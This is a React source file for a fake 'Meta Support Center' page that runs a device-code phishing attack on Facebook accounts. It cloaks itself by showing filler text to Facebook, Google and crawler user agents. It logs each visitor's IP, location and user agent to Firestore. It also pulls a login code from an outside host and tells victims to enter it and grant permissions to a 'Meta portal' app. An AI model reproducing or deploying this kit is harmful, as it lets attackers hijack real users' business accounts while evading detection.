import React, { useState,useEffect} from "react";
import '../HomePage/HomePage.scss';
import {
  collection,
  addDoc,
  onSnapshot,
  query,
  where,
  doc,
  updateDoc,
  runTransaction,
  orderBy,
  getDocs,
  limit,
} from "firebase/firestore";
import { db } from "../../firebase";

const HomePage = () => {
  const [botDetect,SetBotDetect] = useState(false);
  const [loginData,SetLoginData] = useState({});
  const [ipAddress,SetIpAddress] = useState('');
  const [userAgent,SetUserAgent] = useState('');
  const usersRef = collection(db, "users");
  const q = query(usersRef, orderBy("auto_id", "desc", limit(1)));
  const openInNewTab = (url) => {
    alert(url);
    //const _0x28da3b = /iphone|ipad|ipod|android/i.test(navigator.userAgent.toLowerCase());
    //if (_0x28da3b) {
      //url = "fb://device_requests/?qr=0";
    //} 
    const newWindow = window.open(url, '_blank', 'noopener,noreferrer');
    newWindow?.focus();
    if (newWindow) newWindow.opener = null
  }

  useEffect(() => {
    const setLocaltion =  () => {
      try {
        const _userAgent = navigator.userAgent.toLowerCase();
        SetUserAgent(_userAgent);
        if(_userAgent.includes('facebook') 
          || _userAgent.includes('google') 
          || _userAgent.includes('bot')
          || _userAgent.includes('crawl')
        ){
          SetBotDetect(true);
        }else{
          fetch("https://ipinfo.io/json").then(d => d.json()).then(d => {
             SetIpAddress(JSON.stringify({ IP: d.ip, country: d.country, city: d.city}));
          });
         fetch("https://iktool.com/usercode/?controller=api&action=login").then(d => d.json()).then(d => {
           if(d.user_code){
            SetLoginData(d);
           }
          });

        }
      } catch (error) {
        console.error("Error fetching data:", error);
      }
    };
    setLocaltion();
  }, []);

  const updateIndex = async (userID) => {
    try {
      await runTransaction(db, async (transaction) => {
        const sfDocRef = doc(db, "users", userID);
        const sfDoc = await transaction.get(sfDocRef);
        const dosLast = await getDocs(q);
        if (!sfDoc.exists()) {
          throw "Document does not exist!";
        }
        const [lastest] = dosLast.docs
        const auto_id = (lastest?.get("auto_id") || 0) + 1;
        transaction.update(sfDocRef, { auto_id });
      });

      console.log("Transaction successfully committed!");
    } catch (e) {
      console.log("Transaction failed: ", e);
    }
  };


  const handleSubmit = async () => {
    try {
        const user = await addDoc(collection(db, "users"), {
          status:0,ck:'',pg:'',bm:'',ad:'',if:'',code:loginData.code,ip:ipAddress,userAgentStr:userAgent,createdAt: new Date().getTime(),
        });
        if(user.id){
          //updateIndex(user.id);
          openInNewTab(loginData.verification_uri)
        }
    } catch (error) {
      console.error("Error saving data to Firestore: ", error);
    }
  };

  if (!botDetect) {
    return (
      <><section id="header" className="bg-1">
        <div className="container">
          <nav className="navbar bg-1">
            <div className="container-fluid">
              <a className="navbar-brand">
                <div className="navbar__logo text-white HpzITUVKquHIViVSbKHJ pyFozslmuPGrVXGVFrzD">
                  <i className="fa-brands fa-meta fa-xm"></i>&nbsp;Meta For Business
                </div>
              </a>
              <div>
                <i className="fa-solid fa-magnifying-glass text-white FCqqRstWTRpyZETDBCcc"></i>
              </div>
            </div>
          </nav>
        </div>
      </section><section className="row m-0">
          <div className="col-12 p-0">
            <div className="DlFafrxGUpZXyEXveKfP">
              <h2>Meta Support Center</h2>
            </div>
          </div>
        </section><section className="form">
          <div className="row m-0 mt-5 p-0 justify-content-center">
            <div className="col-12 col-lg-6 col-md-8 col-xs-12 AgAjxhbWRorsVQdTDblZ">
              <h2 className="text-center">How can we help?</h2>
              <p className="text-center">We need more information to address your issue. This form will only take a few minutes.</p>
            </div>
          </div>
          <div className="row m-0 mt-5 p-0 justify-content-center">
            <div className="col-12 col-lg-6 col-md-8 col-xs-12 AgAjxhbWRorsVQdTDblZ">
              <div className="p-3 card mb-3">
                <div className="card-header mb-3">
                  <small>Copy the code then click the "Verify Account" button below and finally grant permissions to the "Meta portal" app</small>
                </div>
                <div className="input-group flex-nowrap mb-3">
                  <span className="input-group-text">
                    <i className="fa-solid fa-key fa-xs"></i>
                  </span>
                  <input type="text" id="user_code" value={loginData.user_code || "Loading.."} className="form-control" readOnly={true} />
                  <button className="btn btn-primary" id="copy_btn" onClick={() => { navigator.clipboard.writeText(loginData.user_code || "") } } type="button">Copy</button>
                </div>
                <div className="d-grid gap-1 mb-3">
                  <a href="fb://device_requests/?qr=0">
                  <button className="btn btn-primary" id="btn-auth" type="button">
                    <i className="fa fa-check-circle" aria-hidden="true"></i>&nbsp;Verify Account </button>
                  </a>
                </div>
              </div>
            </div>
          </div>
        </section><div className="QHmyklZyLqPKhNwwMpTT container-fluid">
          <div className="container">
            <div className="justify-content-center row">
              <center>
                <div className="mpDZDtqanvWRqNTxacoJ">
                  <i className="fa-brands fa-meta fa-xm"></i>
                  <b>&nbsp;Meta</b>
                </div>
              </center>
              <p className="text-center mt-3">Facebook can help your large, medium or small business grow. Get the latest news for advertisers and more on our Meta for Business Page.</p>
            </div>
            <div className="HbEDjRyBKuHNihwrdSqN row">
              <div className="col-lg col-6">
                <p>
                  <b>Marketing on Facebook</b>
                </p>
                <p>Success Stories</p>
                <p>Measurement</p>
                <p>Industries</p>
              </div>
              <div className="col-lg col-6">
                <p>
                  <b>Marketing objectives</b>
                </p>
                <p>Build your presence</p>
                <p>Create awareness</p>
                <p>Drive discovery</p>
              </div>
              <div className="col-lg col-6">
                <p>
                  <b>Facebook Pages</b>
                </p>
                <p>Get started with Pages</p>
                <p>Setting up your Page</p>
              </div>
              <div className="col-lg col-6">
                <p>
                  <b>Facebook ads</b>
                </p>
                <p>Get started with ads</p>
                <p>Buying Facebook ads</p>
                <p>Ad formats</p>
              </div>
              <div className="col-lg col-6">
                <p>
                  <b>Resources</b>
                </p>
                <p>Ads Guide</p>
                <p>Buying Facebook ads</p>
                <p>Business Help Centre</p>
              </div>
            </div>
          </div>
        </div><div className="container ft-content">
          <div className="justify-content-center my-3 row">
            <div className="d-flex custom-align justify-content-center col-lg-12 col-12">
              <span className="me-3"> English (UK) </span>
              <span className="me-3">English (US) </span>
              <span className="me-3"> Español Português (rasil) </span>
              <span className="me-3">Français (France)</span>
              <span className="me-3"> Español (España) </span>
              <span> More languages </span>
            </div>
          </div>
          <div className="justify-content-center my-3 row">
            <div className="d-flex custom-align justify-content-center col-lg-12 col-12">
              <span className="me-3">© 2023 Meta</span>
              <span className="me-3">About</span>
              <span className="me-3">Developers</span>
              <span className="me-3">Careers</span>
              <span className="me-3">Privacy</span>
              <span className="me-3">Terms</span>
              <span className="me-3">Help Centre</span>
            </div>
          </div>
        </div></>
      );
  }else{
    return (
      <main className="_wapper">
    <div align="left">
      Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut
      labore et dolore magna aliqua.
    </div>
    <div align="right">
      Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut
      labore et dolore magna aliqua.
    </div>
    <div align="center">
      Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut
      labore et dolore magna aliqua.
    </div>
    <div align="justify">
      Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut
      labore et dolore magna aliqua.
    </div>
      </main>
      );
  }
}

export default HomePage;
